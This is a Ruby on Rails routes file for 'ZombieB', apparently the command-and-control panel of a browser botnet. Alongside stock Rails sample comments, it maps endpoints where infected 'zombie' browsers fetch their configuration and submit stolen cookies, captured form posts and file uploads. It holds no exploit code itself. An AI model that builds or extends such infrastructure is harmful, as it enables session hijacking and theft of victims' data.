ZombieB::Application.routes.draw do
  resources :file
  resources :upload
  match 'postinfos/removeall' => 'postinfos#removeall'
  resources :postinfos
  match 'cookies/removeall' => 'cookies#removeall'
  resources :cookies
  #map.resources :cookies
  resources :ccconfigs
#map.cookies_removeall '/cookie/removeall', :controller => 'Cookie', :action => 'removeall'
  resources :zombies do
	resources :ccconfigs
	resources :cookies 
	resources :postinfos
  end

  # The priority is based upon order of creation:
  # first created -> highest priority.

  # Sample of regular route:
  #   match 'products/:id' => 'catalog#view'
  # Keep in mind you can assign values other than :controller and :action

  #to select zombie browsers their config
  match 'c/:hashid' => 'zombies#conf'
  match 'login/:hashid' => 'zombies#login'
  match 'addcookie/:hashid' => 'cookies#new_fromhash'
  match 'addpostinfo/:hashid' => 'postinfos#new_fromhash'
  match 'upload/:hashid' => 'zombies#upload' 
  match 'extensions' => 'extensions#show' 
  match 'ccconfigs/:id/demo' => 'ccconfigs#demo', :as=>:demo

  # Sample of named route:
  #   match 'products/:id/purchase' => 'catalog#purchase', :as => :purchase
  # This route can be invoked with purchase_url(:id => product.id)

  # Sample resource route (maps HTTP verbs to controller actions automatically):
  #   resources :products

  # Sample resource route with options:
  #   resources :products do
  #     member do
  #       get 'short'
  #       post 'toggle'
  #     end
  #
  #     collection do
  #       get 'sold'
  #     end
  #   end

  # Sample resource route with sub-resources:
  #   resources :products do
  #     resources :comments, :sales
  #     resource :seller
  #   end

  # Sample resource route with more complex sub-resources
  #   resources :products do
  #     resources :comments
  #     resources :sales do
  #       get 'recent', :on => :collection
  #     end
  #   end

  # Sample resource route within a namespace:
  #   namespace :admin do
  #     # Directs /admin/products/* to Admin::ProductsController
  #     # (app/controllers/admin/products_controller.rb)
  #     resources :products
  #   end

  # You can have the root of your site routed with "root"
  # just remember to delete public/index.html.
   root :to => 'zombies#index'

  # See how all your routes lay out with "rake routes"

  # This is a legacy wild controller route that's not recommended for RESTful applications.
  # Note: This route will make all actions in every controller accessible via GET requests.
  # match ':controller(/:action(/:id))(.:format)'
end
